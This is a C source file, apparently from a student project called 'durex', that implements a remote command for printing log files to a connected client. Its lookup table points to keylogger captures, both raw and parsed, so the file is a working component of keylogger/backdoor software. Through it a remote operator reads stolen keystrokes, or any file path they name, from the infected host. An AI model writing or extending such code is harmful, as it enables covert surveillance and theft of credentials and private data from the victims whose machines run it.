/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   cmd_log.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/20 18:32:14 by mdufaud           #+#    #+#             */
/*   Updated: 2018/08/28 16:41:54 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"
#include <fcntl.h>

static const t_logtype	g_logtype[] = {
	{"log", LOG_PATH},
	{"kl", KEYLOG_PATH},
	{"kl_parsed", KEYLOG_PARSE_PATH},
	{"kl_simple", KEYLOG_PARSE_SIMPLE_PATH},
	{NULL, NULL}
};

static t_list		*reverse_list(t_list *log, int *size)
{
	t_list	*new;
	t_list	*tmp;

	new = NULL;
	*size = 0;
	while (log)
	{
		tmp = log;
		log = log->next;
		ft_lstadd(&new, tmp);
		*size = *size + 1;
	}
	return (new);
}

static void			print_last_log(t_durex *durex, int co, t_list *log, int n)
{
	t_list	*tmp;
	int		size;
	int		i;

	log = reverse_list(log, &size);
	i = 0;
	while (log)
	{
		if (size - i <= n)
		{
			message_client(durex, co, (char *)log->content);
			message_client(durex, co, "\n");
		}
		i++;
		tmp = log;
		log = log->next;
		free(tmp->content);
		free(tmp);
	}
}

static void			open_print_log(t_durex *durex, int co, char *path, int n)
{
	int		fd;
	char	*line;
	t_list	*log;
	char	*s;

	if ((fd = open(path, O_RDONLY)) == -1)
	{
		ft_sprintf(&s, "Could not open %s\n", path);
		message_client(durex, co, s);
		free(s);
		return ;
	}
	ft_sprintf(&s, "Printing %s last %d lines\n", path, n);
	message_client(durex, co, s);
	free(s);
	line = NULL;
	log = NULL;
	while (get_next_line(fd, &line) > 0)
	{
		ft_lstadd(&log, ft_lstnew(line, ft_strlen(line) + 1));
		free(line);
	}
	print_last_log(durex, co, log, n);
	close(fd);
}

int					cmd_print_log(t_durex *durex, int co)
{
	int		i;
	char	*path;
	int		n;

	i = 0;
	path = durex->cmd[1] ? durex->cmd[1] : g_logtype[0].path;
	n = 20;
	while (durex->cmd[1] && g_logtype[i].log)
	{
		if (ft_strequ(g_logtype[i].log, durex->cmd[1]))
			path = g_logtype[i].path;
		i++;
	}
	if (durex->cmd[1] && durex->cmd[2])
		n = ft_atoi(durex->cmd[2]);
	n = n < 0 ? 20 : n;
	n = n > 100 ? 100 : n;
	open_print_log(durex, co, path, n);
	return (1);
}
